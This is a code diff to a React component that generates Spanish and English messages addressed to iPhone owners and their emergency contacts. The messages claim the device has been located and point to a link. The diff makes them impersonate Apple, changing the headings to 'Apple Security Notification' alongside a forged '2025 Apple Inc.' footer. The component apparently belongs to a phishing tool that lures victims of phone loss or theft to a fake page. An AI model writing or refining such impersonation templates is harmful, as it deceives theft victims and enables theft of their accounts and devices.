@@ -259,7 +259,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       if (language === 'spanish') {
         if (process.contact_type === 'propietario') {
           // Mensaje para propietario - VERSION OPTIMIZADA
-          message = `🚨 ¡ALERTA URGENTE!
+          message = `🔐 Notificación de Seguridad de Apple
 
 🔍 Tu iPhone fue detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}** tras haberse conectado a internet.
 💡 Esto indica que el dispositivo **está activo y ha sido localizado con éxito**.
@@ -282,7 +282,7 @@ ${process.url ? `🌍 Ver estado del dispositivo: ${process.url}` : ''}
 ©️ 2025 Apple Inc.`;
         } else {
           // Mensaje para contacto de emergencia - VERSION OPTIMIZADA
-          message = `🚨 ¡DISPOSITIVO LOCALIZADO!
+          message = `🔐 Notificación de Seguridad de Apple
 
 📱 El iPhone de **${process.owner_name || 'usuario registrado'}** ha sido detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}**.
 
@@ -311,7 +311,7 @@ ${process.url ? `🌍 Ver ubicación en tiempo real: ${process.url}` : ''}
         // Mensajes en inglés - VERSION OPTIMIZADA
         if (process.contact_type === 'propietario') {
           // Owner message in English - OPTIMIZED VERSION
-          message = `🚨 URGENT ALERT!
+          message = `🔐 Apple Security Notification
 
 🔍 Your iPhone was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}** after connecting to the internet.
 💡 This indicates that the device **is active and has been successfully located**.
@@ -334,7 +334,7 @@ ${process.url ? `🌍 View device status: ${process.url}` : ''}
 ©️ 2025 Apple Inc.`;
         } else {
           // Emergency contact message in English - OPTIMIZED VERSION
-          message = `🚨 DEVICE LOCATED!
+          message = `🔐 Apple Security Notification
 
 📱 The iPhone belonging to **${process.owner_name || 'registered user'}** was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}**.
 
